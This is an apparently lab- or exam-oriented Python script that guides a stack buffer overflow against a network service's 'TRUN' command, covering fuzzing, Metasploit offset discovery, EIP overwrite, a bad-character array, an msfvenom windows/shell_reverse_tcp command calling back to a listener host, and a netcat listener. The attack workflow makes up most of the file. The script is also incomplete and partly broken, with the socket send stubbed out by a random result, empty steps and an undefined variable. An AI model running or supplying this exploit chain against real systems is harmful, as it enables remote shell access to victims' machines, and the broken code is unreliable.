#!/usr/bin/python

#import sys
import socket
import random
#import builtins
import os
from time import sleep

class color:
   PURPLE = '\033[1;35;48m'
   CYAN = '\033[1;36;48m'
   BOLD = '\033[1;37;48m'
   BLUE = '\033[1;34;48m'
   GREEN = '\033[1;32;48m'
   YELLOW = '\033[1;33;48m'
   RED = '\033[1;31;48m'
   BLACK = '\033[1;30;48m'
   UNDERLINE = '\033[4;37;48m'
   END = '\033[1;37;0m'

def sendWebBuffer(buffer):
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 10.11.0.22\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://10.11.0.22/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.1.215", 80))
  s.send(buffer)
  s.close()


def sendBuffer(buffer):

    try:
        print(color.BLUE + "sending buffer [" +  str(len(buffer)) + "] " + str(buffer) + color.END)
        #s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.connect(( ip,port ))
        #s.send(( buffer))
        #s.close()
        #return True
        #       test code for random boolean 
        
        return bool(random.getrandbits(1))
    except:
        return False
def pause():
    print("you have work to do")
    os.system('pause >NULL')  # this will pause untill any key is pressed.
    return 0


ip='192.168.1.1'
port=9999
bufferinput='TRUN /.:/'
allchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")



#STEP 1 FUZZ THE INPUT#################################################
print(color.BLUE + "Fuzzing" + color.END)
def fuzzing(buffer):
    keepfuzzing=True
    while keepfuzzing:
        res = sendBuffer(buffer)
        if (res == True):
            buffer = buffer + "A"*100
            sleep(1)
        else:
            keepfuzzing = False
    print ("Fuzzing crashed at %s bytes" % str( len( buffer ) ) ) 
    return buffer


bufferA = ("A" * 100)
bufferA = fuzzing(bufferA)
bufferA = "A" * 800
print("The fuzzing length is ", len(bufferA))
pause()

#STEP 2 FIND THE OFFSET#################################################
print(color.BLUE + "Find the offset" + color.END)
# buffer needs to be populated from metasploit create_pattern
#   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
print(color.BLUE + "Find the offset" + color.END)
print(color.YELLOW + "Generate buffer pattern from metasploit and replace the bufferOffset variable below"+ color.END)
print("     /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l", len(bufferA))
bufferCreate = input("Paste the buffer offset from metasploit  :   ")
print("sending bufferinput + bufferCreate")
sendBuffer(bufferinput + bufferCreate)
print(color.YELLOW + "Query the EIP value from immunity debugger" + color.END)
exactmatchoffset = input('Enter the value of the EIP eg. 386F4337  42306142  :   ')
print("     /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l", len(bufferA)," -q", exactmatchoffset)
s2_msoffset=int(input("Enter the offset found by the pattern_offset tool  :   "))
print ("s2_msoffset = ", s2_msoffset)


s2_filler       = "A" * s2_msoffset                                       # A's until we hit the eip offset
s2_eip          = "B" * 4                                               # B's for the eip offset 
s2_offset       = "C" * (len(bufferA) - (s2_msoffset + len(s2_eip)))      # C's make up the remainder of our bufferA length
 
s2_payload = s2_filler + s2_eip + s2_offset
sendBuffer(bufferinput + s2_payload)
print(color.YELLOW + "Check the EIP in immunity debugger. Do we have exactly 42424242 which is BBBB ?" + color.END)
pause()

#STEP 3#################################################
print(color.BLUE + "Pad our buffer" + color.END)
# we want to overwrite the BBBB with a valid address but we need to know where we can point it
# usual shellcode lenght is between 350 to 400 bytes, lets guestimate it as 1500
s3_bufferlength = 1500
s3_filler       = "A" * s2_msoffset                                     # A's until we hit the eip offset
s3_eip          = "B" * 4                                               # B's for the eip offset 
s3_offset       = "C" * 4                                               # C's make up the remainder of our bufferA length 
s3_buffer       = "D" * (s3_bufferlength - len(s3_filler) - len(s3_eip) - len(s3_offset))    # lets push D's so we can get our payload in

s3_inputBuffer = s3_filler + s3_eip + s3_offset + s3_buffer
sendBuffer(s3_inputBuffer)
print(color.YELLOW + "Check the EIP in immunity debugger. Do we have exactly 42424242 which is BBBB ?" + color.END)
print(color.YELLOW + "Check the ESP in immunity debugger. Is it pointing at our D's ?" + color.END)
print(color.YELLOW + "Where do our D's finish in the offset? is it +2C4?" + color.END)
#print(color.YELLOW + "The length of our shellcode can be calculated via calculator programmer mode 2C4 = 708 DEC so we have 708 ?" + color.END)
pause()


#STEP 4#################################################
print(color.BLUE + "Bad char check" + color.END)
badcharbuffer = s3_filler + s3_eip + s3_offset + allchars
sendBuffer(badcharbuffer)
print(color.YELLOW + "Check the hex values that contain errors and add them to the badchars array - null byte, 0x00 is always bad, for webs, 0x0A line feed terminates a http field" + color.END)
#example badchars = r"\x00"     
badchars = input(r"Enter the bad chars  eg. \x00\x01 :   ")

#STEP 6#################################################
print(color.BLUE + "Find our return address to replace the BBBB" + color.END)





#STEP 6#################################################
print(color.BLUE + "Generate the shell code" + color.END)
print(color.YELLOW + "Time to generate our shell code. Modify the LHOST, LPORT, -f is c code, -a(architecture) = x86 and -b (badchars) from above" + color.END)
print("     msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b \"" + str((badchars)) + "\"")
shellcode = input('Paste in the shell code from msfvenom (clean up first by removing " \\r \\n ; characters) ')

#STEP 7#################################################
print(color.BLUE + "Attack" + color.END)
print(color.YELLOW + "open up a new netcat listener. nc -nlvp 4444 " + color.END)





print("open up a new netcat listener. nc -nlvp 4444 ")
